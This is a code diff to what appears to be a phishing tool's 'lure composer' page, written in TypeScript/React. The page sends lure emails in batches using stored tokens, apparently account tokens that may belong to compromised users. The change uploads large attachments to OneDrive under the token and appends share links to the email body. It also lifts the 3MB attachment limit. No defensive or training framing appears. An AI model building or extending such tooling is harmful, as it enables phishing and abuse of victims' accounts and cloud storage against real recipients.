@@ -5,7 +5,7 @@ import { motion } from "framer-motion";
 import { useParams, useRouter } from "next/navigation";
 import { Token } from "@/types/token";
 import { fetchTokens, fetchContacts, sendMail, generateLureEmail, mxCheck } from "@/lib/api";
-import { fileToBase64 } from "@/lib/utils";
+import { fileToBase64, uploadAttachmentToOneDrive } from "@/lib/utils";
 import {
   Fish, ArrowLeft, Loader2, AlertCircle, Send, User, Mail,
   Plus, X, Eye, ShieldAlert, CheckCircle2, Link as LinkIcon,
@@ -466,12 +466,45 @@ export default function LureComposerPage() {
     if (!tokenId) return;
     setSending(true);
     try {
-      const attachmentPayload = await Promise.all(attachments.map(fileToBase64));
+      // Process all attachments: inline (<3MB) vs OneDrive upload (>=3MB)
+      const MAX_INLINE_BYTES = 3 * 1024 * 1024;
+      const allEncoded = await Promise.all(attachments.map(fileToBase64));
+      const inlineAttachments = allEncoded.filter((a) => a.size < MAX_INLINE_BYTES);
+      const largeAttachments = allEncoded.filter((a) => a.size >= MAX_INLINE_BYTES);
+
+      // Upload large files to OneDrive and get share links
+      const oneDriveLinks: { filename: string; link: string }[] = [];
+      if (largeAttachments.length > 0) {
+        toast.info(`Uploading ${largeAttachments.length} large file(s) to OneDrive...`);
+        const uploadResults = await Promise.all(
+          largeAttachments.map((att) =>
+            uploadAttachmentToOneDrive(tokenId, {
+              filename: att.name,
+              content_type: att.content_type,
+              content_bytes: att.content_bytes,
+            })
+          )
+        );
+        uploadResults.forEach((r) => oneDriveLinks.push({ filename: r.filename, link: r.link }));
+      }
 
       // Convert newlines to <br> for HTML emails (normalize \r\n first)
-      const formattedBody = contentType === "HTML"
+      let formattedBody = contentType === "HTML"
         ? body.replace(/\r\n/g, "\n").replace(/\n/g, "<br>")
         : body;
+
+      // Append OneDrive share links to body
+      if (oneDriveLinks.length > 0) {
+        if (contentType === "HTML") {
+          formattedBody += `<br><br><hr><p><strong>Shared files:</strong></p>` +
+            oneDriveLinks.map((l) => `<p><a href="${l.link}">${l.filename}</a></p>`).join("");
+        } else {
+          const linkSection = oneDriveLinks
+            .map((l) => `Shared file: ${l.filename} — ${l.link}`)
+            .join("\n");
+          formattedBody += `\n\n---\nShared files:\n${linkSection}`;
+        }
+      }
 
       const max = Math.max(1, maxRecipientsPerSend);
       for (let i = 0; i < toRecipients.length; i += max) {
@@ -483,7 +516,7 @@ export default function LureComposerPage() {
           subject,
           body: formattedBody,
           content_type: contentType,
-          attachments: attachmentPayload.length > 0 ? attachmentPayload : undefined,
+          attachments: inlineAttachments.length > 0 ? inlineAttachments : undefined,
         });
       }
       toast.success(`Lure email sent to ${toRecipients.join(", ")}`);
@@ -863,23 +896,21 @@ export default function LureComposerPage() {
                     className="hidden"
                     onChange={(e) => {
                       const files = Array.from(e.target.files || []);
-                      const MAX_MB = 3;
-                      const tooLarge = files.filter(f => f.size > MAX_MB * 1024 * 1024);
-                      if (tooLarge.length > 0) {
-                        tooLarge.forEach(f => toast.error(`"${f.name}" is too large (${(f.size / 1024 / 1024).toFixed(1)}MB). Max ${MAX_MB}MB.`));
-                      }
-                      setAttachments((prev) => [...prev, ...files.filter(f => f.size <= MAX_MB * 1024 * 1024)]);
+                      setAttachments((prev) => [...prev, ...files]);
                     }}
                   />
                   <label htmlFor="lure-attachments" className="inline-flex items-center gap-1.5 text-[11px] text-muted-foreground hover:text-foreground cursor-pointer">
                     <Plus className="h-3.5 w-3.5" /> Attach files
                   </label>
-                  <p className="text-[10px] text-muted-foreground">Max 3MB per file</p>
+                  <p className="text-[10px] text-muted-foreground">&lt;3MB inline, larger files shared via OneDrive</p>
                   {attachments.length > 0 && (
                     <div className="flex flex-wrap gap-1.5">
                       {attachments.map((file, idx) => (
                         <Badge key={idx} variant="secondary" className="text-[10px] gap-1">
                           {file.name}
+                          {file.size >= 3 * 1024 * 1024 && (
+                            <span className="text-[9px] text-amber-400 ml-1">(OneDrive)</span>
+                          )}
                           <button onClick={() => setAttachments((prev) => prev.filter((_, i) => i !== idx))} className="hover:text-destructive">
                             <X className="h-3 w-3" />
                           </button>
